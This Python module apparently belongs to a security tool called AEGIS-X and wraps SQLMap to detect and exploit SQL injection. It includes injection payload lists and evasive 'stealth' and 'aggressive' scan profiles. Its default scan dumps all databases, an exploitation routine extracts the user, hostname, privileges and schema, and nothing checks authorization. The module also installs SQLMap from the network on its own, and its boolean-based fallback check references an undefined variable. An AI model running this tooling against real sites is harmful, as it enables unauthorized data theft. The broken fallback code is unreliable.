#!/usr/bin/env python3
"""
Advanced SQLMap Integration for AEGIS-X
Integrates with SQLMap for advanced SQL injection detection and exploitation
"""

import asyncio
import subprocess
import json
import os
import tempfile
import logging
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
import re
import time

logger = logging.getLogger(__name__)

@dataclass
class SQLMapResult:
    url: str
    parameter: str
    injection_type: str
    technique: str
    payload: str
    dbms: str
    dbms_version: str
    os: str
    vulnerability_details: Dict[str, Any]
    exploitation_data: Dict[str, Any]
    risk_level: str
    confidence: int
    raw_output: str

class AdvancedSQLMapIntegration:
    """Advanced SQLMap integration with custom configurations and enhanced detection"""
    
    def __init__(self):
        self.sqlmap_path = self._find_sqlmap_binary()
        self.results = []
        self.session_path = tempfile.mkdtemp(prefix='aegis_sqlmap_')
        
        # Advanced scanning configurations
        self.scan_configs = {
            'stealth': {
                'level': 1,
                'risk': 1,
                'delay': 2,
                'timeout': 10,
                'retries': 1,
                'threads': 1,
                'technique': 'B',  # Boolean-based blind
                'tamper': ['space2comment', 'randomcase']
            },
            'aggressive': {
                'level': 5,
                'risk': 3,
                'delay': 0,
                'timeout': 30,
                'retries': 3,
                'threads': 10,
                'technique': 'BEUSTQ',  # All techniques
                'tamper': ['space2comment', 'randomcase', 'charencode']
            },
            'comprehensive': {
                'level': 3,
                'risk': 2,
                'delay': 1,
                'timeout': 20,
                'retries': 2,
                'threads': 5,
                'technique': 'BEUST',  # Most techniques
                'tamper': ['space2comment', 'randomcase']
            }
        }
        
        # Custom payloads for different scenarios
        self.custom_payloads = {
            'time_based': [
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1' AND pg_sleep(5)--",
                "1' AND SLEEP(5)#"
            ],
            'union_based': [
                "1' UNION SELECT 1,2,3,4,5--",
                "1' UNION ALL SELECT NULL,NULL,NULL--",
                "1' UNION SELECT @@version,NULL,NULL--"
            ],
            'error_based': [
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            'boolean_based': [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND 1=1--",
                "1' AND 1=2--"
            ]
        }
    
    def _find_sqlmap_binary(self) -> Optional[str]:
        """Find SQLMap binary or install it"""
        # Check if sqlmap is in PATH
        try:
            result = subprocess.run(['which', 'sqlmap'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        # Check common installation paths
        common_paths = [
            '/usr/bin/sqlmap',
            '/usr/local/bin/sqlmap',
            '/opt/sqlmap/sqlmap.py',
            os.path.expanduser('~/sqlmap/sqlmap.py')
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        # Try to install sqlmap
        logger.info("Installing SQLMap...")
        try:
            install_cmd = [
                'bash', '-c',
                'cd /opt && '
                'git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git && '
                'chmod +x /opt/sqlmap/sqlmap.py && '
                'ln -sf /opt/sqlmap/sqlmap.py /usr/local/bin/sqlmap'
            ]
            subprocess.run(install_cmd, check=True, capture_output=True)
            return '/usr/local/bin/sqlmap'
        except Exception as e:
            logger.warning(f"Could not install SQLMap: {e}")
            return None
    
    async def scan_url(self, url: str, scan_type: str = 'comprehensive', 
                      parameters: Optional[List[str]] = None) -> List[SQLMapResult]:
        """Perform comprehensive SQLMap scan on URL"""
        if not self.sqlmap_path:
            logger.warning("SQLMap not available, using fallback detection")
            return await self._fallback_sql_detection(url, parameters)
        
        config = self.scan_configs.get(scan_type, self.scan_configs['comprehensive'])
        results = []
        
        try:
            # Build sqlmap command
            cmd = [
                'python3', self.sqlmap_path,
                '-u', url,
                '--batch',  # Non-interactive mode
                '--random-agent',
                '--level', str(config['level']),
                '--risk', str(config['risk']),
                '--delay', str(config['delay']),
                '--timeout', str(config['timeout']),
                '--retries', str(config['retries']),
                '--threads', str(config['threads']),
                '--technique', config['technique'],
                '--output-dir', self.session_path,
                '--format', 'JSON'
            ]
            
            # Add tamper scripts
            if config['tamper']:
                cmd.extend(['--tamper', ','.join(config['tamper'])])
            
            # Add specific parameters if provided
            if parameters:
                cmd.extend(['-p', ','.join(parameters)])
            
            # Add advanced options
            cmd.extend([
                '--dbs',  # Enumerate databases
                '--tables',  # Enumerate tables
                '--columns',  # Enumerate columns
                '--dump-all',  # Dump all data (be careful!)
                '--exclude-sysdbs'  # Exclude system databases
            ])
            
            logger.info(f"Running SQLMap scan on {url} with {scan_type} configuration")
            
            # Run sqlmap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0 or 'vulnerable' in stdout.decode().lower():
                # Parse results
                results = await self._parse_sqlmap_output(stdout.decode(), url)
            else:
                logger.debug(f"SQLMap scan completed with no vulnerabilities found")
                logger.debug(f"SQLMap output: {stdout.decode()}")
        
        except Exception as e:
            logger.error(f"Error running SQLMap scan: {e}")
        
        self.results.extend(results)
        return results
    
    async def _parse_sqlmap_output(self, output: str, url: str) -> List[SQLMapResult]:
        """Parse SQLMap output and extract vulnerability information"""
        results = []
        
        try:
            # Look for vulnerability indicators in output
            lines = output.split('\n')
            current_result = {}
            
            for line in lines:
                line = line.strip()
                
                # Parse different types of information
                if 'Parameter:' in line:
                    current_result['parameter'] = line.split('Parameter:')[1].strip()
                elif 'Type:' in line:
                    current_result['injection_type'] = line.split('Type:')[1].strip()
                elif 'Title:' in line:
                    current_result['technique'] = line.split('Title:')[1].strip()
                elif 'Payload:' in line:
                    current_result['payload'] = line.split('Payload:')[1].strip()
                elif 'back-end DBMS:' in line:
                    current_result['dbms'] = line.split('back-end DBMS:')[1].strip()
                elif 'web server operating system:' in line:
                    current_result['os'] = line.split('web server operating system:')[1].strip()
                elif 'vulnerable' in line.lower() and current_result:
                    # Create result when vulnerability is confirmed
                    result = SQLMapResult(
                        url=url,
                        parameter=current_result.get('parameter', 'unknown'),
                        injection_type=current_result.get('injection_type', 'unknown'),
                        technique=current_result.get('technique', 'unknown'),
                        payload=current_result.get('payload', ''),
                        dbms=current_result.get('dbms', 'unknown'),
                        dbms_version='',
                        os=current_result.get('os', 'unknown'),
                        vulnerability_details=current_result.copy(),
                        exploitation_data={},
                        risk_level=self._calculate_risk_level(current_result),
                        confidence=self._calculate_confidence(current_result),
                        raw_output=output
                    )
                    results.append(result)
                    current_result = {}
        
        except Exception as e:
            logger.error(f"Error parsing SQLMap output: {e}")
        
        return results
    
    def _calculate_risk_level(self, result_data: Dict[str, Any]) -> str:
        """Calculate risk level based on vulnerability details"""
        injection_type = result_data.get('injection_type', '').lower()
        
        if 'union' in injection_type or 'error' in injection_type:
            return 'critical'
        elif 'time' in injection_type or 'boolean' in injection_type:
            return 'high'
        else:
            return 'medium'
    
    def _calculate_confidence(self, result_data: Dict[str, Any]) -> int:
        """Calculate confidence score based on detection method"""
        technique = result_data.get('technique', '').lower()
        
        if 'union' in technique:
            return 95
        elif 'error' in technique:
            return 90
        elif 'time' in technique:
            return 85
        elif 'boolean' in technique:
            return 80
        else:
            return 70
    
    async def _fallback_sql_detection(self, url: str, parameters: Optional[List[str]] = None) -> List[SQLMapResult]:
        """Fallback SQL injection detection when SQLMap is not available"""
        logger.info(f"Performing fallback SQL injection detection on {url}")
        results = []
        
        # Test common SQL injection points
        test_points = [
            {'param': 'id', 'value': '1'},
            {'param': 'username', 'value': 'admin'},
            {'param': 'search', 'value': 'test'},
            {'param': 'q', 'value': 'query'}
        ]
        
        if parameters:
            test_points = [{'param': p, 'value': '1'} for p in parameters]
        
        import aiohttp
        
        async with aiohttp.ClientSession() as session:
            for point in test_points:
                for payload_type, payloads in self.custom_payloads.items():
                    for payload in payloads[:3]:  # Test first 3 payloads of each type
                        try:
                            # Build test URL
                            test_url = f"{url}?{point['param']}={payload}"
                            
                            start_time = time.time()
                            async with session.get(test_url, timeout=15) as response:
                                response_time = time.time() - start_time
                                content = await response.text()
                                
                                # Detect SQL injection based on response
                                is_vulnerable = False
                                detection_method = ''
                                
                                if payload_type == 'time_based' and response_time > 4:
                                    is_vulnerable = True
                                    detection_method = 'Time-based blind SQL injection'
                                elif payload_type == 'error_based' and any(error in content.lower() for error in [
                                    'mysql', 'sql syntax', 'ora-', 'postgresql', 'sqlite', 'database error'
                                ]):
                                    is_vulnerable = True
                                    detection_method = 'Error-based SQL injection'
                                elif payload_type == 'union_based' and response.status == 200 and len(content) > 100:
                                    is_vulnerable = True
                                    detection_method = 'Union-based SQL injection'
                                elif payload_type == 'boolean_based':
                                    # Test both true and false conditions
                                    true_payload = payload.replace("'1'='2", "'1'='1")
                                    false_url = f"{url}?{point['param']}={false_payload}"
                                    
                                    async with session.get(false_url, timeout=10) as false_response:
                                        false_content = await false_response.text()
                                        
                                        if len(content) != len(false_content):
                                            is_vulnerable = True
                                            detection_method = 'Boolean-based blind SQL injection'
                                
                                if is_vulnerable:
                                    result = SQLMapResult(
                                        url=test_url,
                                        parameter=point['param'],
                                        injection_type=payload_type,
                                        technique=detection_method,
                                        payload=payload,
                                        dbms='unknown',
                                        dbms_version='unknown',
                                        os='unknown',
                                        vulnerability_details={
                                            'response_time': response_time,
                                            'status_code': response.status,
                                            'content_length': len(content)
                                        },
                                        exploitation_data={},
                                        risk_level='high',
                                        confidence=75,
                                        raw_output=content[:1000]
                                    )
                                    results.append(result)
                        
                        except Exception as e:
                            logger.debug(f"Error testing SQL injection on {point['param']}: {e}")
        
        return results
    
    async def exploit_vulnerability(self, result: SQLMapResult) -> Dict[str, Any]:
        """Attempt to exploit confirmed SQL injection vulnerability"""
        if not self.sqlmap_path:
            return {'status': 'error', 'message': 'SQLMap not available for exploitation'}
        
        try:
            # Build exploitation command
            cmd = [
                'python3', self.sqlmap_path,
                '-u', result.url,
                '--batch',
                '--random-agent',
                '--level', '3',
                '--risk', '2',
                '-p', result.parameter,
                '--output-dir', self.session_path
            ]
            
            # Add specific exploitation options
            exploitation_options = [
                '--current-user',  # Get current database user
                '--current-db',    # Get current database
                '--hostname',      # Get hostname
                '--privileges',    # Check user privileges
                '--roles',         # Check user roles
                '--dbs',          # List databases
                '--tables',       # List tables
                '--schema'        # Get database schema
            ]
            
            cmd.extend(exploitation_options)
            
            logger.info(f"Exploiting SQL injection vulnerability in {result.parameter}")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            # Parse exploitation results
            exploitation_data = {
                'status': 'success' if process.returncode == 0 else 'failed',
                'output': stdout.decode(),
                'errors': stderr.decode(),
                'extracted_data': self._extract_exploitation_data(stdout.decode())
            }
            
            return exploitation_data
        
        except Exception as e:
            logger.error(f"Error exploiting SQL injection: {e}")
            return {'status': 'error', 'message': str(e)}
    
    def _extract_exploitation_data(self, output: str) -> Dict[str, Any]:
        """Extract useful data from exploitation output"""
        data = {}
        
        # Extract database information
        if 'current user:' in output.lower():
            match = re.search(r'current user:\s*\'([^\']+)\'', output, re.IGNORECASE)
            if match:
                data['current_user'] = match.group(1)
        
        if 'current database:' in output.lower():
            match = re.search(r'current database:\s*\'([^\']+)\'', output, re.IGNORECASE)
            if match:
                data['current_database'] = match.group(1)
        
        if 'hostname:' in output.lower():
            match = re.search(r'hostname:\s*\'([^\']+)\'', output, re.IGNORECASE)
            if match:
                data['hostname'] = match.group(1)
        
        # Extract database names
        db_match = re.findall(r'Database:\s*([^\n]+)', output, re.IGNORECASE)
        if db_match:
            data['databases'] = db_match
        
        # Extract table names
        table_match = re.findall(r'Table:\s*([^\n]+)', output, re.IGNORECASE)
        if table_match:
            data['tables'] = table_match
        
        return data
    
    def get_scan_summary(self) -> Dict[str, Any]:
        """Get comprehensive scan summary"""
        if not self.results:
            return {'total': 0, 'by_type': {}, 'by_risk': {}, 'exploitable': 0}
        
        summary = {
            'total': len(self.results),
            'by_type': {},
            'by_risk': {},
            'by_dbms': {},
            'exploitable': 0,
            'high_risk_findings': []
        }
        
        for result in self.results:
            # Count by injection type
            inj_type = result.injection_type
            summary['by_type'][inj_type] = summary['by_type'].get(inj_type, 0) + 1
            
            # Count by risk level
            risk = result.risk_level
            summary['by_risk'][risk] = summary['by_risk'].get(risk, 0) + 1
            
            # Count by DBMS
            dbms = result.dbms
            summary['by_dbms'][dbms] = summary['by_dbms'].get(dbms, 0) + 1
            
            # Count exploitable vulnerabilities
            if result.confidence > 80:
                summary['exploitable'] += 1
            
            # High-risk findings
            if result.risk_level in ['critical', 'high']:
                summary['high_risk_findings'].append({
                    'url': result.url,
                    'parameter': result.parameter,
                    'type': result.injection_type,
                    'risk': result.risk_level,
                    'confidence': result.confidence
                })
        
        return summary
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            import shutil
            shutil.rmtree(self.session_path, ignore_errors=True)
        except Exception as e:
            logger.error(f"Error cleaning up SQLMap session: {e}")